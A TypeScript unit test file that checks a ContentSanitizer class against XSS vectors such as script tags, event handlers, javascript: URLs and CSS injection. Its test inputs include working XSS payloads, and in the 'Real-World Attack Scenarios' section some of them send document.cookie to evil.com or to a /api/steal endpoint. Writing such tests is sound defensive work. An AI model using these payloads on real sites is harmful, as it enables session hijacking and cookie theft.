/**
 * ContentSanitizer Security Tests
 * 
 * Comprehensive security tests for the ContentSanitizer class.
 * Tests XSS prevention, script tag removal, event handler removal,
 * URL protocol validation, and various attack vectors.
 * 
 * **Validates: Requirements 19.1, 19.2, 19.4, 19.5**
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { ContentSanitizer, DEFAULT_SANITIZATION_CONFIG } from './ContentSanitizer';

describe('ContentSanitizer', () => {
  let sanitizer: ContentSanitizer;

  beforeEach(() => {
    sanitizer = new ContentSanitizer();
  });

  /**
   * Test script tag removal
   * **Validates: Requirement 19.1**
   */
  describe('Script Tag Removal', () => {
    it('should remove script tags from HTML', () => {
      const malicious = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('<p>Hello</p>');
      expect(sanitized).toContain('<p>World</p>');
    });

    it('should remove script tags with attributes', () => {
      const malicious = '<p>Test</p><script type="text/javascript" src="evil.js">alert("XSS")</script>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('evil.js');
      expect(sanitized).toContain('<p>Test</p>');
    });

    it('should remove inline script tags', () => {
      const malicious = '<p>Before</p><script>document.cookie</script><p>After</p>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('document.cookie');
    });

    it('should remove multiple script tags', () => {
      const malicious = '<script>alert(1)</script><p>Text</p><script>alert(2)</script>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert(1)');
      expect(sanitized).not.toContain('alert(2)');
      expect(sanitized).toContain('<p>Text</p>');
    });

    it('should remove nested script tags', () => {
      const malicious = '<div><script>alert("nested")</script></div>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove script tags with CDATA', () => {
      const malicious = '<script><![CDATA[alert("XSS")]]></script>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('CDATA');
    });
  });

  /**
   * Test event handler removal
   * **Validates: Requirement 19.1**
   */
  describe('Event Handler Removal', () => {
    it('should remove onclick event handlers', () => {
      const malicious = '<p onclick="alert(\'XSS\')">Click me</p>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('<p>Click me</p>');
    });

    it('should remove onload event handlers', () => {
      const malicious = '<img src="image.jpg" onload="alert(\'XSS\')" />';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove onerror event handlers', () => {
      const malicious = '<img src="invalid.jpg" onerror="alert(\'XSS\')" />';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove onmouseover event handlers', () => {
      const malicious = '<div onmouseover="alert(\'XSS\')">Hover me</div>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove all on* event handlers', () => {
      const malicious = `
        <div 
          onclick="alert(1)" 
          onmouseover="alert(2)" 
          onload="alert(3)"
          onerror="alert(4)"
          onfocus="alert(5)"
          onblur="alert(6)"
        >
          Test
        </div>
      `;
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('onfocus');
      expect(sanitized).not.toContain('onblur');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove event handlers with different casings', () => {
      const malicious = '<p onClick="alert(1)" ONLOAD="alert(2)">Test</p>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized.toLowerCase()).not.toContain('onclick');
      expect(sanitized.toLowerCase()).not.toContain('onload');
    });
  });

  /**
   * Test URL protocol validation
   * **Validates: Requirement 19.4**
   */
  describe('URL Protocol Validation', () => {
    it('should allow http URLs', () => {
      const url = 'http://example.com';
      expect(sanitizer.validateURL(url)).toBe(true);
    });

    it('should allow https URLs', () => {
      const url = 'https://example.com';
      expect(sanitizer.validateURL(url)).toBe(true);
    });

    it('should allow mailto URLs', () => {
      const url = 'mailto:test@example.com';
      expect(sanitizer.validateURL(url)).toBe(true);
    });

    it('should allow data URLs for images', () => {
      const url = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
      expect(sanitizer.validateURL(url)).toBe(true);
    });

    it('should reject javascript: protocol', () => {
      const url = 'javascript:alert("XSS")';
      expect(sanitizer.validateURL(url)).toBe(false);
    });

    it('should reject vbscript: protocol', () => {
      const url = 'vbscript:msgbox("XSS")';
      expect(sanitizer.validateURL(url)).toBe(false);
    });

    it('should reject data:text/html protocol', () => {
      const url = 'data:text/html,<script>alert("XSS")</script>';
      expect(sanitizer.validateURL(url)).toBe(false);
    });

    it('should reject empty URLs', () => {
      expect(sanitizer.validateURL('')).toBe(false);
      expect(sanitizer.validateURL('   ')).toBe(false);
    });

    it('should reject null or undefined URLs', () => {
      expect(sanitizer.validateURL(null as any)).toBe(false);
      expect(sanitizer.validateURL(undefined as any)).toBe(false);
    });

    it('should handle relative URLs', () => {
      const url = '/path/to/page';
      expect(sanitizer.validateURL(url)).toBe(true);
    });

    it('should sanitize links with javascript: protocol', () => {
      const malicious = '<a href="javascript:alert(\'XSS\')">Click</a>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('href');
    });

    it('should sanitize images with javascript: protocol in src', () => {
      const malicious = '<img src="javascript:alert(\'XSS\')" />';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('javascript:');
    });
  });

  /**
   * Test XSS attack vectors
   * **Validates: Requirements 19.1, 19.2, 19.4, 19.5**
   */
  describe('XSS Attack Vectors', () => {
    it('should prevent XSS via img onerror', () => {
      const malicious = '<img src="x" onerror="alert(\'XSS\')" />';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });

    it('should prevent XSS via iframe', () => {
      const malicious = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should prevent XSS via object tag', () => {
      const malicious = '<object data="javascript:alert(\'XSS\')"></object>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<object');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should prevent XSS via embed tag', () => {
      const malicious = '<embed src="javascript:alert(\'XSS\')" />';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<embed');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should prevent XSS via form tag', () => {
      const malicious = '<form action="javascript:alert(\'XSS\')"><input type="submit" /></form>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<form');
      expect(sanitized).not.toContain('<input');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should prevent XSS via meta refresh', () => {
      const malicious = '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')" />';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<meta');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should prevent XSS via link tag', () => {
      const malicious = '<link rel="stylesheet" href="javascript:alert(\'XSS\')" />';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<link');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should prevent XSS via style tag with expression', () => {
      const malicious = '<style>body { background: expression(alert("XSS")); }</style>';
      const sanitized = sanitizer.sanitize(malicious);
      
      // Style tag is not in the whitelist, so it gets removed but content is preserved
      // This is safe because the CSS cannot execute without the <style> tag
      expect(sanitized).not.toContain('<style');
      expect(sanitized).not.toContain('</style>');
    });

    it('should prevent XSS via SVG script', () => {
      const malicious = '<svg><script>alert("XSS")</script></svg>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('alert');
    });

    it('should prevent XSS via base tag', () => {
      const malicious = '<base href="javascript:alert(\'XSS\')" />';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<base');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should prevent XSS via applet tag', () => {
      const malicious = '<applet code="XSS.class"></applet>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<applet');
    });

    it('should prevent XSS via button with onclick', () => {
      const malicious = '<button onclick="alert(\'XSS\')">Click</button>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<button');
      expect(sanitized).not.toContain('onclick');
    });

    it('should prevent XSS via textarea', () => {
      const malicious = '<textarea onfocus="alert(\'XSS\')"></textarea>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<textarea');
      expect(sanitized).not.toContain('onfocus');
    });

    it('should prevent XSS via select', () => {
      const malicious = '<select onchange="alert(\'XSS\')"><option>Test</option></select>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('<select');
      expect(sanitized).not.toContain('onchange');
    });
  });

  /**
   * Test dangerous style attributes
   * **Validates: Requirement 19.2**
   */
  describe('Dangerous Style Attributes', () => {
    it('should remove style with expression', () => {
      const malicious = '<div style="background: expression(alert(\'XSS\'))">Test</div>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('expression');
    });

    it('should remove style with behavior', () => {
      const malicious = '<div style="behavior: url(xss.htc)">Test</div>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('behavior');
    });

    it('should remove style with -moz-binding', () => {
      const malicious = '<div style="-moz-binding: url(xss.xml#xss)">Test</div>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('-moz-binding');
    });

    it('should remove style with javascript:', () => {
      const malicious = '<div style="background: url(javascript:alert(\'XSS\'))">Test</div>';
      const sanitized = sanitizer.sanitize(malicious);
      
      expect(sanitized).not.toContain('javascript:');
    });

    it('should allow safe style attributes', () => {
      const safe = '<span style="color: red; font-weight: bold;">Text</span>';
      const sanitized = sanitizer.sanitize(safe);
      
      expect(sanitized).toContain('style=');
      expect(sanitized).toContain('color: red');
      expect(sanitized).toContain('font-weight: bold');
    });
  });

  /**
   * Test whitelist functionality
   * **Validates: Requirement 19.2**
   */
  describe('Tag Whitelist', () => {
    it('should allow whitelisted tags', () => {
      const safe = '<p>Text</p><strong>Bold</strong><em>Italic</em>';
      const sanitized = sanitizer.sanitize(safe);
      
      expect(sanitized).toContain('<p>Text</p>');
      expect(sanitized).toContain('<strong>Bold</strong>');
      expect(sanitized).toContain('<em>Italic</em>');
    });

    it('should remove non-whitelisted tags but preserve content', () => {
      const html = '<p>Text</p><custom-tag>Content</custom-tag>';
      const sanitized = sanitizer.sanitize(html);
      
      expect(sanitized).toContain('<p>Text</p>');
      expect(sanitized).not.toContain('<custom-tag>');
      expect(sanitized).toContain('Content');
    });

    it('should allow all default whitelisted tags', () => {
      const html = `
        <p>Paragraph</p>
        <h1>Heading 1</h1>
        <h2>Heading 2</h2>
        <strong>Strong</strong>
        <em>Emphasis</em>
        <u>Underline</u>
        <code>Code</code>
        <ul><li>List item</li></ul>
        <table><tr><td>Cell</td></tr></table>
      `;
      const sanitized = sanitizer.sanitize(html);
      
      expect(sanitized).toContain('<p>Paragraph</p>');
      expect(sanitized).toContain('<h1>Heading 1</h1>');
      expect(sanitized).toContain('<strong>Strong</strong>');
      expect(sanitized).toContain('<em>Emphasis</em>');
      expect(sanitized).toContain('<code>Code</code>');
      expect(sanitized).toContain('<li>List item</li>');
      expect(sanitized).toContain('<td>Cell</td>');
    });
  });

  /**
   * Test attribute whitelist
   * **Validates: Requirement 19.2**
   */
  describe('Attribute Whitelist', () => {
    it('should allow whitelisted attributes on links', () => {
      const html = '<a href="https://example.com" title="Example" target="_blank">Link</a>';
      const sanitized = sanitizer.sanitize(html);
      
      expect(sanitized).toContain('href="https://example.com"');
      expect(sanitized).toContain('title="Example"');
      expect(sanitized).toContain('target="_blank"');
    });

    it('should allow whitelisted attributes on images', () => {
      const html = '<img src="image.jpg" alt="Description" width="100" height="100" />';
      const sanitized = sanitizer.sanitize(html);
      
      expect(sanitized).toContain('src="image.jpg"');
      expect(sanitized).toContain('alt="Description"');
      expect(sanitized).toContain('width="100"');
      expect(sanitized).toContain('height="100"');
    });

    it('should remove non-whitelisted attributes', () => {
      const html = '<p class="test" data-custom="value" id="para">Text</p>';
      const sanitized = sanitizer.sanitize(html);
      
      expect(sanitized).not.toContain('class=');
      expect(sanitized).not.toContain('data-custom=');
      expect(sanitized).not.toContain('id=');
      expect(sanitized).toContain('Text');
    });

    it('should allow whitelisted class attribute on code tags', () => {
      const html = '<code class="language-javascript">const x = 1;</code>';
      const sanitized = sanitizer.sanitize(html);
      
      expect(sanitized).toContain('class="language-javascript"');
    });
  });

  /**
   * Test HTML escaping
   * **Validates: Requirement 19.5**
   */
  describe('HTML Escaping', () => {
    it('should escape HTML entities', () => {
      const text = '<script>alert("XSS")</script>';
      const escaped = sanitizer.escapeHTML(text);
      
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
      expect(escaped).toContain('&lt;/script&gt;');
    });

    it('should escape special characters', () => {
      const text = '< > & " \'';
      const escaped = sanitizer.escapeHTML(text);
      
      expect(escaped).toContain('&lt;');
      expect(escaped).toContain('&gt;');
      expect(escaped).toContain('&amp;');
    });

    it('should handle empty strings', () => {
      expect(sanitizer.escapeHTML('')).toBe('');
    });

    it('should handle null and undefined', () => {
      expect(sanitizer.escapeHTML(null as any)).toBe('');
      expect(sanitizer.escapeHTML(undefined as any)).toBe('');
    });
  });

  /**
   * Test configuration
   */
  describe('Configuration', () => {
    it('should use default configuration', () => {
      const config = sanitizer.getConfig();
      
      expect(config.allowedTags).toEqual(DEFAULT_SANITIZATION_CONFIG.allowedTags);
      expect(config.allowedProtocols).toEqual(DEFAULT_SANITIZATION_CONFIG.allowedProtocols);
      expect(config.stripScripts).toBe(true);
    });

    it('should allow custom configuration', () => {
      const customSanitizer = new ContentSanitizer({
        allowedTags: ['p', 'strong'],
        allowedProtocols: ['https:'],
      });
      
      const config = customSanitizer.getConfig();
      expect(config.allowedTags).toEqual(['p', 'strong']);
      expect(config.allowedProtocols).toEqual(['https:']);
    });

    it('should update configuration at runtime', () => {
      sanitizer.updateConfig({
        allowedTags: ['p'],
      });
      
      const html = '<p>Text</p><strong>Bold</strong>';
      const sanitized = sanitizer.sanitize(html);
      
      expect(sanitized).toContain('<p>Text</p>');
      expect(sanitized).not.toContain('<strong>');
      expect(sanitized).toContain('Bold'); // Content preserved
    });

    it('should create strict sanitizer', () => {
      const strict = ContentSanitizer.createStrict();
      const html = '<p>Text</p><div>Div</div><img src="test.jpg" />';
      const sanitized = strict.sanitize(html);
      
      expect(sanitized).toContain('<p>Text</p>');
      expect(sanitized).not.toContain('<div>');
      expect(sanitized).not.toContain('<img');
    });

    it('should create permissive sanitizer', () => {
      const permissive = ContentSanitizer.createPermissive();
      const html = '<section><article>Content</article></section>';
      const sanitized = permissive.sanitize(html);
      
      expect(sanitized).toContain('<section>');
      expect(sanitized).toContain('<article>');
    });
  });

  /**
   * Test edge cases
   */
  describe('Edge Cases', () => {
    it('should handle empty input', () => {
      expect(sanitizer.sanitize('')).toBe('');
    });

    it('should handle null input', () => {
      expect(sanitizer.sanitize(null as any)).toBe('');
    });

    it('should handle undefined input', () => {
      expect(sanitizer.sanitize(undefined as any)).toBe('');
    });

    it('should handle plain text without HTML', () => {
      const text = 'Just plain text';
      expect(sanitizer.sanitize(text)).toBe('Just plain text');
    });

    it('should handle deeply nested HTML', () => {
      const html = '<div><div><div><p>Deep</p></div></div></div>';
      const sanitized = sanitizer.sanitize(html);
      
      expect(sanitized).toContain('<p>Deep</p>');
    });

    it('should handle malformed HTML', () => {
      const malformed = '<p>Unclosed paragraph<div>Div</div>';
      const sanitized = sanitizer.sanitize(malformed);
      
      // Browser will auto-close tags
      expect(sanitized).toContain('Unclosed paragraph');
      expect(sanitized).toContain('Div');
    });

    it('should handle mixed safe and unsafe content', () => {
      const mixed = '<p>Safe</p><script>alert("XSS")</script><strong>Also safe</strong>';
      const sanitized = sanitizer.sanitize(mixed);
      
      expect(sanitized).toContain('<p>Safe</p>');
      expect(sanitized).toContain('<strong>Also safe</strong>');
      expect(sanitized).not.toContain('<script>');
    });

    it('should handle Unicode characters', () => {
      const unicode = '<p>Hello 世界 🌍</p>';
      const sanitized = sanitizer.sanitize(unicode);
      
      expect(sanitized).toContain('Hello 世界 🌍');
    });

    it('should handle HTML entities', () => {
      const entities = '<p>&lt;script&gt;alert("XSS")&lt;/script&gt;</p>';
      const sanitized = sanitizer.sanitize(entities);
      
      expect(sanitized).toContain('&lt;script&gt;');
      expect(sanitized).not.toContain('<script>');
    });
  });

  /**
   * Test real-world attack scenarios
   */
  describe('Real-World Attack Scenarios', () => {
    it('should prevent stored XSS attack', () => {
      const storedXSS = '<div><script>fetch("/api/steal?cookie=" + document.cookie)</script></div>';
      const sanitized = sanitizer.sanitize(storedXSS);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('fetch');
      expect(sanitized).not.toContain('document.cookie');
    });

    it('should prevent reflected XSS attack', () => {
      const reflectedXSS = '<img src=x onerror="this.src=\'http://evil.com/steal?\'+document.cookie" />';
      const sanitized = sanitizer.sanitize(reflectedXSS);
      
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('document.cookie');
    });

    it('should prevent DOM-based XSS attack', () => {
      const domXSS = '<a href="javascript:void(0)" onclick="location.href=\'http://evil.com?c=\'+document.cookie">Click</a>';
      const sanitized = sanitizer.sanitize(domXSS);
      
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('document.cookie');
    });

    it('should prevent CSS injection attack', () => {
      const cssInjection = '<div style="background: url(\'javascript:alert(1)\')">Test</div>';
      const sanitized = sanitizer.sanitize(cssInjection);
      
      expect(sanitized).not.toContain('javascript:');
    });

    it('should prevent SVG-based XSS', () => {
      const svgXSS = '<svg onload="alert(\'XSS\')"><circle r="50" /></svg>';
      const sanitized = sanitizer.sanitize(svgXSS);
      
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('alert');
    });

    it('should prevent data URI XSS in images', () => {
      const dataUriXSS = '<img src="data:text/html,<script>alert(\'XSS\')</script>" />';
      const sanitized = sanitizer.sanitize(dataUriXSS);
      
      expect(sanitized).not.toContain('data:text/html');
    });

    it('should allow safe data URI for images', () => {
      const safeDataUri = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="Safe" />';
      const sanitized = sanitizer.sanitize(safeDataUri);
      
      expect(sanitized).toContain('data:image/png');
      expect(sanitized).toContain('base64');
    });
  });
});
